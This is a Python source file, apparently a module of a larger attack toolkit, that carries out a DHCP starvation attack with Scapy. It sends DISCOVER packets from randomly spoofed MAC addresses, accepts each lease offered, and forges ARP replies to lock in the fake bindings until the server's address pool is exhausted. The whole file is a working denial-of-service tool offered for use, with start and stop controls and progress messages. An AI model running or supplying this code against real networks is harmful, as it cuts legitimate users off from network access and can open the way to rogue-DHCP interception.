import random
import threading
import time
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP
from Server.core.remote_output import remote_print

# Global control flags and performance counters
is_running = False
starve_thread = None
active_leases = 0


def dhcp_discover(spoofed_mac, xid, i_face):
    """Broadcasts a DHCP DISCOVER packet using a randomized spoofed MAC and unique transaction ID."""
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"

    dsc = Ether(src=spoofed_mac, dst=mac_dest)
    dsc /= IP(src='0.0.0.0', dst=ip_dest)
    dsc /= UDP(sport=68, dport=67)
    dsc /= BOOTP(chaddr=mac2str(spoofed_mac), xid=xid, flags=0x8000)
    dsc /= DHCP(options=[
        ("message-type", "discover"),
        ("param_req_list", [1, 3, 6, 15]),
        ("max_message_size", 576),
        "end"
    ])
    sendp(dsc, iface=i_face, verbose=False)


def dhcp_request(req_ip, spoofed_mac, server_ip, xid, i_face):
    """Sends a DHCP REQUEST packet to formally claim and lock down an offered IP lease."""
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"

    req = Ether(src=spoofed_mac, dst=mac_dest)
    req /= IP(src="0.0.0.0", dst=ip_dest)
    req /= UDP(sport=68, dport=67)
    req /= BOOTP(chaddr=mac2str(spoofed_mac), xid=xid)
    req /= DHCP(
        options=[
            ("message-type", "request"),
            ("server_id", server_ip),
            ("requested_addr", req_ip),
            ("param_req_list", [1, 3, 6, 15]),
            "end"
        ])
    sendp(req, iface=i_face, verbose=False)


def arp_reply(src_ip, source_mac, server_ip, server_mac, i_face):
    """Sends a forced ARP reply to cement the fake IP-to-MAC binding on the DHCP server."""
    reply = ARP(op=2, hwsrc=mac2str(source_mac), psrc=src_ip, hwdst=server_mac, pdst=server_ip)
    send(reply, iface=i_face, verbose=False)


def _starve_loop(target_ip, i_face, persistent):
    """High-speed asynchronous loop that floods DISCOVERs and instantly claims OFFERs."""
    global is_running, active_leases
    active_leases = 0
    server_mac = None

    # Resolve DHCP server MAC address via ARP if target IP is provided
    if target_ip:
        try:
            remote_print(f"[*] Resolving MAC address for DHCP server: {target_ip}...")
            ans = sr1(ARP(op=1, pdst=str(target_ip)), timeout=2, verbose=False)
            if ans:
                server_mac = ans[ARP].hwsrc
                remote_print(f"[+] Found Server MAC: {server_mac}")
        except Exception:
            pass

    # Thread-safe dictionary to track pending transaction IDs and their spoofed MACs: {xid: mac}
    pending_requests = {}
    lock = threading.Lock()

    def packet_callback(p):
        """Asynchronous callback handling incoming DHCP OFFER packets in real time."""
        global active_leases
        if (
                UDP in p and
                (p[UDP].sport in [67, 68] and p[UDP].dport in [67, 68]) and
                DHCP in p and
                any(opt[0] == 'message-type' and opt[1] == 2 for opt in p[DHCP].options if isinstance(opt, tuple))
        ):
            if BOOTP in p:
                xid = p[BOOTP].xid
                offered_ip = p[BOOTP].yiaddr
                server_ip = p[IP].src

                # Safely retrieve and remove the matching MAC from pending requests
                with lock:
                    mac = pending_requests.pop(xid, None)

                # If a valid offer matches our request, complete the handshake immediately
                if mac and offered_ip:
                    target_server = target_ip if target_ip else server_ip
                    active_leases += 1
                    remote_print(f"[+] Lease #{active_leases} Secured | IP: {offered_ip} | MAC: {mac}")

                    # Complete lease acquisition and lock binding with ARP
                    dhcp_request(req_ip=offered_ip, spoofed_mac=mac, server_ip=target_server, xid=xid, i_face=i_face)
                    if server_mac:
                        arp_reply(src_ip=offered_ip, source_mac=mac, server_ip=target_server, server_mac=server_mac,
                                  i_face=i_face)

    # Initialize and start Scapy's high-performance non-blocking background sniffer
    sniffer = AsyncSniffer(iface=i_face, prn=packet_callback, store=False)
    sniffer.start()
    remote_print("[*] High-speed background sniffer active. Blasting DISCOVER packets...")

    try:
        # Rapidly generate fake MAC addresses and blast DISCOVER bursts without blocking
        while is_running:
            mac = str(RandMAC())
            xid = random.randint(1, 1000000000)

            with lock:
                pending_requests[xid] = mac

            dhcp_discover(spoofed_mac=mac, xid=xid, i_face=i_face)

            # Short delay to maintain high throughput without overloading CPU/network buffers
            time.sleep(0.08)

    finally:
        # Ensure clean shutdown of sniffer and reporting upon exit
        sniffer.stop()
        remote_print(f"[+] Starvation loop exited. Total dynamic leases secured: {active_leases}")


def start_starve(target_ip=0, i_face=None, persistent=False):
    """Spawns the high-speed asynchronous DHCP starvation attack thread."""
    global is_running, starve_thread
    is_running = True
    starve_thread = threading.Thread(
        target=_starve_loop,
        args=(target_ip, i_face, persistent),
        daemon=True
    )
    starve_thread.start()
    remote_print(f"[*] High-Speed DHCP Starvation running against target: {target_ip or 'Auto'}")
    input("Press Enter to stop...\n")
    stop_starve()


def stop_starve():
    """Signals the starvation loop to terminate safely."""
    global is_running
    is_running = False
    remote_print("[+] DHCP Starvation stopped.")